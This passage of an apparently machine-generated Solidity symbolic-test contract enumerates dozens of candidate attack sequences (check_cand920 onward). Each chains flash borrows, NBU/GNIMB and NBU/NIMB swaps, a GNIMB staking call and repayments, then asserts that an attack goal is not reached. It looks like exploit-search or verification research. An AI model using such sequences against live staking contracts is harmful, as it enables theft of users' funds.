        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_owner_gnimb(amt0);
        swap_pairnbugnimb_nbu_gnimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_owner_nbu(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand920(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        swap_pairnbugnimb_nbu_gnimb(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbugnimb_gnimb_nbu(amt2);
        swap_pairnbugnimb_gnimb_nbu(amt3);
        swap_pairnbugnimb_nbu_gnimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand921(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_owner_nbu(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbugnimb_nbu_gnimb(amt2);
        payback_owner_nbu(amt3);
        payback_owner_gnimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand922(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_owner_nbu(amt0);
        swap_pairnbugnimb_gnimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_owner_nbu(amt3);
        payback_owner_gnimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand923(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_owner_gnimb(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbugnimb_nbu_gnimb(amt2);
        payback_owner_nbu(amt3);
        payback_owner_gnimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand924(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_owner_gnimb(amt0);
        swap_pairnbugnimb_gnimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_owner_nbu(amt3);
        payback_owner_gnimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand925(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_owner_gnimb(amt0);
        borrow_owner_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbugnimb_nbu_gnimb(amt3);
        payback_owner_nbu(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand926(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_owner_gnimb(amt0);
        borrow_owner_nbu(amt1);
        swap_pairnbugnimb_gnimb_nbu(amt2);
        transaction_gnimbstaking_gnimb(amt3);
        payback_owner_gnimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand927(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_owner_gnimb(amt0);
        borrow_owner_nbu(amt1);
        swap_pairnbugnimb_gnimb_nbu(amt2);
        transaction_gnimbstaking_gnimb(amt3);
        payback_owner_nbu(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand928(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        borrow_owner_nbu(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbugnimb_nbu_gnimb(amt2);
        swap_pairnbugnimb_nbu_gnimb(amt3);
        payback_owner_gnimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand929(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_owner_nbu(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbugnimb_nbu_gnimb(amt2);
        payback_owner_nbu(amt3);
        swap_pairnbugnimb_nbu_gnimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand930(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_owner_nbu(amt0);
        swap_pairnbugnimb_gnimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_owner_nbu(amt3);
        swap_pairnbugnimb_nbu_gnimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand931(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        borrow_owner_gnimb(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbugnimb_nbu_gnimb(amt2);
        swap_pairnbugnimb_nbu_gnimb(amt3);
        payback_owner_gnimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand932(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_owner_gnimb(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbugnimb_nbu_gnimb(amt2);
        payback_owner_nbu(amt3);
        swap_pairnbugnimb_nbu_gnimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand933(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_owner_gnimb(amt0);
        swap_pairnbugnimb_gnimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_owner_nbu(amt3);
        swap_pairnbugnimb_nbu_gnimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand934(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        borrow_owner_nbu(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbugnimb_nbu_gnimb(amt2);
        swap_pairnbugnimb_gnimb_nbu(amt3);
        payback_owner_gnimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand935(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        borrow_owner_nbu(amt0);
        swap_pairnbugnimb_gnimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbugnimb_gnimb_nbu(amt3);
        payback_owner_gnimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand936(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        borrow_owner_gnimb(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbugnimb_nbu_gnimb(amt2);
        swap_pairnbugnimb_gnimb_nbu(amt3);
        payback_owner_gnimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand937(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_owner_gnimb(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbugnimb_nbu_gnimb(amt2);
        payback_owner_nbu(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand938(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        borrow_owner_gnimb(amt0);
        swap_pairnbugnimb_gnimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbugnimb_gnimb_nbu(amt3);
        payback_owner_gnimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand939(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_owner_gnimb(amt0);
        swap_pairnbugnimb_gnimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_owner_nbu(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand940(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        swap_pairnbugnimb_gnimb_nbu(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbugnimb_nbu_gnimb(amt2);
        swap_pairnbugnimb_gnimb_nbu(amt3);
        swap_pairnbugnimb_nbu_gnimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand941(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        vm.assume(amt3 == (amt1 * 1003) / 1000);
        borrow_owner_gnimb(amt0);
        borrow_owner_nimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_owner_nimb(amt3);
        payback_owner_gnimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand942(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt2 == (amt0 * 1003) / 1000);
        borrow_owner_nimb(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        payback_owner_nimb(amt2);
        swap_pairnbugnimb_nbu_gnimb(amt3);
        payback_owner_gnimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand943(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt2 == (amt0 * 1003) / 1000);
        borrow_owner_gnimb(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        payback_owner_nimb(amt2);
        swap_pairnbugnimb_nbu_gnimb(amt3);
        payback_owner_gnimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand944(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_owner_gnimb(amt0);
        borrow_owner_nimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbugnimb_nbu_gnimb(amt3);
        payback_owner_gnimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand945(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        vm.assume(amt3 == (amt1 * 1003) / 1000);
        borrow_owner_gnimb(amt0);
        borrow_owner_nimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_owner_nimb(amt3);
        swap_pairnbugnimb_nbu_gnimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand946(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt2 == (amt0 * 1003) / 1000);
        borrow_owner_nimb(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        payback_owner_nimb(amt2);
        swap_pairnbugnimb_gnimb_nbu(amt3);
        payback_owner_gnimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand947(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt2 == (amt0 * 1003) / 1000);
        borrow_owner_gnimb(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        payback_owner_nimb(amt2);
        swap_pairnbugnimb_gnimb_nbu(amt3);
        payback_owner_gnimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand948(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_owner_gnimb(amt0);
        borrow_owner_nimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbugnimb_gnimb_nbu(amt3);
        payback_owner_gnimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand949(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        vm.assume(amt3 == (amt1 * 1003) / 1000);
        borrow_owner_gnimb(amt0);
        borrow_owner_nimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_owner_nimb(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand950(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        borrow_owner_nimb(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbugnimb_gnimb_nbu(amt2);
        swap_pairnbugnimb_nbu_gnimb(amt3);
        payback_owner_gnimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand951(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt2 == (amt0 * 1003) / 1000);
        borrow_owner_nimb(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        payback_owner_nimb(amt2);
        swap_pairnbugnimb_gnimb_nbu(amt3);
        swap_pairnbugnimb_nbu_gnimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand952(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt2 == (amt0 * 1003) / 1000);
        borrow_owner_gnimb(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        payback_owner_nimb(amt2);
        swap_pairnbugnimb_gnimb_nbu(amt3);
        swap_pairnbugnimb_nbu_gnimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand953(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_owner_nimb(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbunimb_nimb_nbu(amt2);
        payback_owner_nimb(amt3);
        payback_owner_gnimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand954(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_owner_nimb(amt0);
        swap_pairnbunimb_nbu_nimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_owner_nimb(amt3);
        payback_owner_gnimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand955(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_owner_gnimb(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbunimb_nimb_nbu(amt2);
        payback_owner_nimb(amt3);
        payback_owner_gnimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand956(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_owner_gnimb(amt0);
        swap_pairnbunimb_nbu_nimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_owner_nimb(amt3);
        payback_owner_gnimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand957(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_owner_gnimb(amt0);
        borrow_owner_nimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbunimb_nimb_nbu(amt3);
        payback_owner_gnimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand958(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_owner_gnimb(amt0);
        borrow_owner_nimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbunimb_nimb_nbu(amt3);
        payback_owner_nimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand959(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_owner_gnimb(amt0);
        borrow_owner_nimb(amt1);
        swap_pairnbunimb_nbu_nimb(amt2);
        transaction_gnimbstaking_gnimb(amt3);
        payback_owner_gnimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand960(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_owner_gnimb(amt0);
        borrow_owner_nimb(amt1);
        swap_pairnbunimb_nbu_nimb(amt2);
        transaction_gnimbstaking_gnimb(amt3);
        payback_owner_nimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand961(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        borrow_owner_nimb(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbunimb_nimb_nbu(amt2);
        swap_pairnbugnimb_nbu_gnimb(amt3);
        payback_owner_gnimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand962(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_owner_nimb(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbunimb_nimb_nbu(amt2);
        payback_owner_nimb(amt3);
        swap_pairnbugnimb_nbu_gnimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand963(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        borrow_owner_nimb(amt0);
        swap_pairnbunimb_nbu_nimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbugnimb_nbu_gnimb(amt3);
        payback_owner_gnimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand964(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_owner_nimb(amt0);
        swap_pairnbunimb_nbu_nimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_owner_nimb(amt3);
        swap_pairnbugnimb_nbu_gnimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand965(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_owner_gnimb(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbunimb_nimb_nbu(amt2);
        payback_owner_nimb(amt3);
        swap_pairnbugnimb_nbu_gnimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand966(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_owner_gnimb(amt0);
        swap_pairnbunimb_nbu_nimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_owner_nimb(amt3);
        swap_pairnbugnimb_nbu_gnimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand967(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        borrow_owner_nimb(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbunimb_nimb_nbu(amt2);
        swap_pairnbugnimb_gnimb_nbu(amt3);
        payback_owner_gnimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand968(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        borrow_owner_nimb(amt0);
        swap_pairnbunimb_nbu_nimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbugnimb_gnimb_nbu(amt3);
        payback_owner_gnimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand969(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_owner_gnimb(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbunimb_nimb_nbu(amt2);
        payback_owner_nimb(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand970(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_owner_gnimb(amt0);
        swap_pairnbunimb_nbu_nimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_owner_nimb(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand971(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_owner_nimb(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbunimb_nbu_nimb(amt2);
        payback_owner_nimb(amt3);
        payback_owner_gnimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand972(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_owner_nimb(amt0);
        swap_pairnbunimb_nimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_owner_nimb(amt3);
        payback_owner_gnimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand973(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_owner_gnimb(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbunimb_nbu_nimb(amt2);
        payback_owner_nimb(amt3);
        payback_owner_gnimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand974(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
